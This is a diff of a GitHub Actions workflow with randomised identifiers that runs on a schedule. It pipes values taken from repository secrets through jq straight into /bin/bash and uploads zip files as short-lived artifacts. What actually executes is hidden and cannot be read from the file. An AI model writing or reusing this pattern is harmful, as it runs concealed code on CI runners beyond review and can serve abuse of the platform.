@@ -1,23 +1,26 @@
 name: heheizhaodong
-
 on:
   workflow_dispatch:
+
   schedule:
-    - cron: '35 1/6 * * *'
-jobs:  # 26003
+    - cron: '23 4,10,16,22 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: heheizhaodong
         env:
-          bb65761: ${{ secrets.bb65761 }}
+          hxmd48: ${{ secrets.hxmd48 }}
         run: |
-          echo $bb65761 | jq -r .rmju6859 | /bin/bash
-          echo $ajdw33726 | jq -r .h832 | /bin/bash
-          echo $d902 | jq -r .rrbw2067 | /bin/bash
-          echo $dd80 | jq -r .w64 | /bin/bash
-          echo $lpvx12016 | jq -r .gla7 | /bin/bash
-          echo $hkrkr7035 | jq -r .l074 | /bin/bash
+          printf '%s' "$hxmd48" | jq -r .xdohm527 | /bin/bash
+          echo $nqbrk11 | jq -r .v7 | /bin/bash
+          echo $et175 | jq -r .lg0759 | /bin/bash
+          echo $ltt0 | jq -r .tg7 | /bin/bash
 
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: BjUqK4hj
+          path: "*.zip"
+          retention-days: 1
